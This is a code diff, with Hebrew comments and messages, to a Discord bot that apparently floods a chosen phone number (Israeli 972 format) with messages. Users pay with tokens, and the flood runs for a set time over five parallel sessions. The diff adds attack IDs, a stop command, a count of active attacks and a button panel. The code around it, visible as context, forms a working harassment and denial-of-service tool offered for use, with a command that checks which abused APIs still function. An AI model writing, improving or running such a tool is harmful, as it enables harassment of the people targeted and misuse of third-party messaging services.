@@ -36,6 +36,7 @@ class CyberBot(commands.Bot):
         intents.message_content = True
         super().__init__(command_prefix='!', intents=intents)
         self.start_time = datetime.now()
+        self.active_attacks = {}  # מילון לניהול מתקפות פעילות
     
     async def setup_hook(self):
         await self.tree.sync()
@@ -231,30 +232,37 @@ async def fast_advanced_shot(session, api, phone, phone_raw):
     except:
         return False
 
-# ========== מתקפה ==========
-async def run_attack(phone, duration_mins, user_id, interaction):
-    """הרצת מתקפה"""
+# ========== מתקפה עם אפשרות עצירה ==========
+async def run_attack(phone, duration_mins, user_id, interaction, attack_id):
+    """הרצת מתקפה עם אפשרות עצירה"""
     phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
     
     end_time = datetime.now() + timedelta(minutes=duration_mins)
     total_sent = 0
     rounds = 0
+    running = True
     
-    # עדכון ראשוני - פעם אחת בלבד
+    # עדכון ראשוני
     await interaction.followup.send(
         f"⚡ **מתקפה הופעלה!**\n"
         f"📱 טלפון: {phone}\n"
-        f"⏱️ משך: {duration_mins} דקות",
+        f"⏱️ משך: {duration_mins} דקות\n"
+        f"🆔 מזהה מתקפה: {attack_id}",
         ephemeral=True
     )
     
-    logging.info(f"⚡ Attack started - Phone: {phone}")
+    logging.info(f"⚡ Attack started - ID: {attack_id}, Phone: {phone}")
     
     # 5 סשנים במקביל
     sessions = [aiohttp.ClientSession() for _ in range(5)]
     
     try:
-        while datetime.now() < end_time:
+        while running and datetime.now() < end_time:
+            # בדיקה אם ביקשו לעצור
+            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
+                running = False
+                break
+            
             rounds += 1
             round_tasks = []
             
@@ -290,18 +298,24 @@ async def run_attack(phone, duration_mins, user_id, interaction):
         for session in sessions:
             await session.close()
     
+    # ניקוי מהמילון
+    if attack_id in bot.active_attacks:
+        del bot.active_attacks[attack_id]
+    
     # סיכום
+    reason = "הופסקה ידנית" if not running else "הסתיימה"
     try:
         await interaction.followup.send(
-            f"✅ **הסתיים!** סה\"כ {total_sent} הודעות",
+            f"✅ **המתקפה {reason}!**\n"
+            f"📊 סה\"כ {total_sent} הודעות",
             ephemeral=True
         )
     except:
         pass
     
-    logging.info(f"✅ Attack completed - Total: {total_sent}")
+    logging.info(f"✅ Attack {attack_id} completed - Total: {total_sent}")
 
-# ========== פקודת בדיקה ==========
+# ========== פקודת בדיקה (מתוקנת) ==========
 @bot.tree.command(name="check_api", description="בדוק אילו APIs עובדים")
 async def check_api(interaction: discord.Interaction):
     """בודק את כל ה-APIs"""
@@ -352,6 +366,34 @@ async def check_api(interaction: discord.Interaction):
     
     await interaction.followup.send(report, ephemeral=True)
 
+# ========== פקודת עצירה ==========
+@bot.tree.command(name="stop", description="עצור את כל המתקפות הפעילות")
+async def stop_attacks(interaction: discord.Interaction):
+    """עוצר את כל המתקפות"""
+    
+    user_id = str(interaction.user.id)
+    user_attacks = []
+    
+    # מציאת מתקפות של המשתמש
+    for attack_id, status in bot.active_attacks.items():
+        if attack_id.startswith(user_id):
+            user_attacks.append(attack_id)
+    
+    if not user_attacks:
+        await interaction.response.send_message("❌ אין לך מתקפות פעילות", ephemeral=True)
+        return
+    
+    # עצירת כל המתקפות
+    for attack_id in user_attacks:
+        bot.active_attacks[attack_id] = False
+    
+    await interaction.response.send_message(
+        f"🛑 **עצרתי {len(user_attacks)} מתקפות!**",
+        ephemeral=True
+    )
+    
+    logging.info(f"🛑 User {user_id} stopped {len(user_attacks)} attacks")
+
 # ========== ממשק משתמש ==========
 class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
     phone = ui.TextInput(label="📱 מספר טלפון", placeholder="972501234567")
@@ -388,14 +430,39 @@ class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
         # הורדת טוקן
         await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
         
+        # יצירת מזהה מתקפה ייחודי
+        attack_id = f"{user_id}_{datetime.now().timestamp()}"
+        bot.active_attacks[attack_id] = True
+        
         # תשובה ראשונית
         await interaction.response.send_message(
-            f"🚀 **מתקפה הופעלה!**\n📱 {phone}\n⏱️ {duration} דקות\n💎 נותרו: {user_doc['tokens']-1}",
+            f"🚀 **מתקפה הופעלה!**\n"
+            f"📱 {phone}\n"
+            f"⏱️ {duration} דקות\n"
+            f"💎 נותרו: {user_doc['tokens']-1}\n"
+            f"🆔 מזהה: {attack_id[-6:]}",
             ephemeral=True
         )
         
         # הפעלת המתקפה
-        asyncio.create_task(run_attack(phone, duration, user_id, interaction))
+        asyncio.create_task(run_attack(phone, duration, user_id, interaction, attack_id))
+
+class MainView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=180)
+    
+    @discord.ui.button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger)
+    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(AttackModal())
+    
+    @discord.ui.button(label="🔍 בדוק APIs", style=discord.ButtonStyle.secondary)
+    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        # קריאה ישירה לפונקציה, לא ל-Command
+        await check_api(interaction)
+    
+    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary)
+    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await stop_attacks(interaction)
 
 @bot.tree.command(name="setup", description="פתח פאנל שליטה")
 async def setup(interaction: discord.Interaction):
@@ -414,22 +481,9 @@ async def setup(interaction: discord.Interaction):
         color=0x00ff00
     )
     embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
+    embed.add_field(name="🎯 מתקפות פעילות", value=len([a for a in bot.active_attacks if a.startswith(user_id)]), inline=True)
     
-    view = discord.ui.View()
-    attack_btn = discord.ui.Button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger)
-    
-    async def attack_callback(inter):
-        await inter.response.send_modal(AttackModal())
-    
-    attack_btn.callback = attack_callback
-    view.add_item(attack_btn)
-    
-    check_btn = discord.ui.Button(label="🔍 בדוק APIs", style=discord.ButtonStyle.secondary)
-    async def check_callback(inter):
-        await check_api(inter)
-    check_btn.callback = check_callback
-    view.add_item(check_btn)
-    
+    view = MainView()
     await interaction.response.send_message(embed=embed, view=view)
 
 @bot.tree.command(name="tokens", description="בדוק טוקנים")
